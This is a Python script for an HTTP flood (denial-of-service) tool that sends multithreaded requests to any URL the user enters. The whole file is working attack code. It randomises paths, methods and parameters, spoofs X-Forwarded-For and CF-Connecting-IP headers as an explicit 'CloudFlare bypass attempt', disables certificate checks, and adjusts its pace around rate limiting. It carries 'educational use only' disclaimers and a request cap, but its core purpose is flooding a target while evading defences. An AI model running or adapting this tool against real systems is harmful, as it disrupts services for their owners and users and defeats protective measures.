import urllib.request
import concurrent.futures
import random
import re
import os
import time
import socket
import ssl
from colorama import Fore, Style
import threading
import faker
from fake_useragent import UserAgent
import string
from urllib.parse import urlparse

class AdvancedHTTPFlooder:
    """
    HTTP Flood Testing Tool - For Educational and Research Purposes Only
    Combines the best features of both versions with enhanced safety measures
    """

    def __init__(self):
        # Configuration with safety limits
        self.config = {
            'VERSION': "10.0 EDU-PRO",
            'AUTHOR': "CyberSecurity Research Lab",
            'MAX_THREADS': 200,  # Balanced for educational use
            'REQUEST_TIMEOUT': 4,
            'MAX_REQUESTS': 1500,
            'SAFE_MODE': True,
            'DYNAMIC_THROTTLING': True
        }

        # Libraries initialization
        self.fake = faker.Faker()
        self.ua = UserAgent()
        self.context = ssl.create_default_context()
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE

        # Attack state
        self.counter = 0
        self.running = False
        self.start_time = 0
        self.lock = threading.Lock()
        self.adaptive_delay = 0.1

    # ================= Utility Methods =================

    def generate_random_string(self, length=8):
        """Generate random alphanumeric string"""
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

    def generate_complex_path(self):
        """Generate random URL path with variable depth"""
        depths = random.randint(1, 4)  # Safer depth range
        return '/' + '/'.join(self.generate_random_string(random.randint(3, 8)) for _ in range(depths))

    def generate_evasive_headers(self, host):
        """Generate highly randomized HTTP headers with evasion techniques"""
        headers = {
            "User-Agent": self.ua.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": f"{random.choice(['en','ar','fr','es'])}-{random.choice(['US','GB','SA','FR'])};q=0.{random.randint(5,9)}",
            "Accept-Encoding": random.choice(["gzip, deflate, br", "identity", "*"]),
            "Connection": "keep-alive" if random.random() > 0.3 else "close",
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
            "Referer": random.choice([
                f"https://www.google.com/search?q={self.generate_random_string()}",
                f"https://{host}/",
                f"https://example.com/{self.generate_random_string()}"
            ]),
            "X-Forwarded-For": self.fake.ipv4(),
            "X-Request-ID": self.generate_random_string(16),
        }

        # Add occasional suspicious headers (30% chance)
        if random.random() < 0.3:
            headers.update({
                "X-HTTP-Method-Override": random.choice(["PUT", "DELETE"]),
                "X-Originating-IP": self.fake.ipv4(),
                "CF-Connecting-IP": self.fake.ipv4()  # CloudFlare bypass attempt
            })

        return headers

    # ================= Core Attack Methods =================

    def execute_request(self, target):
        """Execute a single HTTP request with advanced evasion"""
        if not self.running or self.counter >= self.config['MAX_REQUESTS']:
            return

        try:
            parsed = urlparse(target)
            host = parsed.netloc
            path = self.generate_complex_path() if random.random() > 0.3 else parsed.path

            # Protocol randomization
            protocol = "https" if random.random() > 0.4 else "http"
            url = f"{protocol}://{host}{path}"

            # Parameter randomization
            if random.random() > 0.2:
                url += f"?{self.generate_random_string()}={self.generate_random_string()}"
                if random.random() > 0.5:
                    url += f"&__={int(time.time())}"

            # Method randomization
            method = random.choice(["GET", "POST", "HEAD"]) if self.config['SAFE_MODE'] else \
                    random.choice(["GET", "POST", "HEAD", "PUT", "OPTIONS"])

            req = urllib.request.Request(
                url,
                headers=self.generate_evasive_headers(host),
                method=method
            )

            try:
                with urllib.request.urlopen(req, timeout=self.config['REQUEST_TIMEOUT'], context=self.context) as res:
                    status = res.status
            except urllib.error.HTTPError as e:
                status = e.code
            except:
                status = 0

            # Adaptive throttling
            if self.config['DYNAMIC_THROTTLING']:
                if status == 429:  # Rate limited
                    self.adaptive_delay = min(1.0, self.adaptive_delay * 1.5)
                elif status == 200:
                    self.adaptive_delay = max(0.05, self.adaptive_delay * 0.9)

            with self.lock:
                self.counter += 1
                self.display_status(status)

        except Exception as e:
            pass

    # ================= Monitoring and Control =================

    def display_status(self, last_status):
        """Display real-time attack statistics"""
        elapsed = time.time() - self.start_time
        rps = self.counter / elapsed if elapsed > 0 else 0

        status_msg = (
            f"{Fore.CYAN}[STATUS]{Fore.RESET} "
            f"Threads: {Fore.YELLOW}{self.config['MAX_THREADS']}{Fore.RESET} | "
            f"Requests: {Fore.GREEN}{self.counter}{Fore.RESET} | "
            f"RPS: {Fore.MAGENTA}{rps:.1f}{Fore.RESET} | "
            f"Last: {Fore.CYAN}{last_status}{Fore.RESET} | "
            f"Delay: {Fore.YELLOW}{self.adaptive_delay:.2f}s{Fore.RESET}"
        )
        print(status_msg, end='\r')

    def start_attack(self, target):
        """Start the controlled HTTP flood test"""
        self.display_banner()

        if not self.validate_target(target):
            print(f"{Fore.RED}[!] Invalid target URL{Fore.RESET}")
            return

        print(f"\n{Fore.YELLOW}[*] Initializing test against: {target}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Safety limits: {self.config['MAX_THREADS']} threads, {self.config['MAX_REQUESTS']} max requests{Fore.RESET}")

        self.running = True
        self.start_time = time.time()

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.config['MAX_THREADS']) as executor:
                # Start the threads
                futures = []
                for _ in range(self.config['MAX_THREADS']):
                    futures.append(executor.submit(self.attack_worker, target))

                # Monitor and control
                while self.running and self.counter < self.config['MAX_REQUESTS']:
                    time.sleep(0.5)
                    if self.config['DYNAMIC_THROTTLING']:
                        time.sleep(self.adaptive_delay)

                # Cleanup
                self.running = False
                concurrent.futures.wait(futures)

        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.RED}[!] Test stopped by user{Fore.RESET}")

        finally:
            self.display_summary()

    def attack_worker(self, target):
        """Worker thread for sending requests"""
        while self.running and self.counter < self.config['MAX_REQUESTS']:
            self.execute_request(target)
            if self.config['DYNAMIC_THROTTLING']:
                time.sleep(self.adaptive_delay)

    # ================= UI and Helpers =================

    def validate_target(self, url):
        """Validate the target URL"""
        try:
            result = urlparse(url)
            return all([result.scheme in ['http','https'], result.netloc])
        except:
            return False

    def display_banner(self):
        """Display the program banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{Fore.RED}
        ██╗  ██╗████████╗████████╗██████╗ ██╗     
        ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗██║     
        ███████║   ██║      ██║   ██████╔╝██║     
        ██╔══██║   ██║      ██║   ██╔═══╝ ██║     
        ██║  ██║   ██║      ██║   ██║     ███████╗
        ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚══════╝
        {Fore.RESET}{"HTTP Flood Tester".center(50)}
        {Fore.CYAN}Version: {self.config['VERSION']} (Educational Use Only){Fore.RESET}
        {Fore.YELLOW}WARNING: Use only on authorized systems!{Fore.RESET}
        """)

    def display_summary(self):
        """Display test summary"""
        elapsed = time.time() - self.start_time
        rps = self.counter / elapsed if elapsed > 0 else 0

        print(f"\n\n{Fore.GREEN}[+] Test completed{Fore.RESET}")
        print(f"{Fore.YELLOW}╔{'═'*40}╗")
        print(f"║ {'Summary'.center(38)} ║")
        print(f"╠{'═'*40}╣")
        print(f"║ {f'Total Requests: {self.counter}'.ljust(38)} ║")
        print(f"║ {f'Duration: {elapsed:.2f} seconds'.ljust(38)} ║")
        print(f"║ {f'Requests/Sec: {rps:.2f}'.ljust(38)} ║")
        print(f"║ {f'Max Threads: {self.config["MAX_THREADS"]}'.ljust(38)} ║")
        print(f"╚{'═'*40}╝\n")

# ================= Main Execution =================

if __name__ == "__main__":
    tester = AdvancedHTTPFlooder()

    # Get target URL safely
    while True:
        target = input(f"{Fore.BLUE}[?] Enter target URL (http(s)://example.com) or 'exit': {Fore.RESET}").strip()
        if target.lower() == 'exit':
            break
        if tester.validate_target(target):
            tester.start_attack(target)
            break
        print(f"{Fore.RED}[!] Invalid URL format. Include http:// or https://{Fore.RESET}")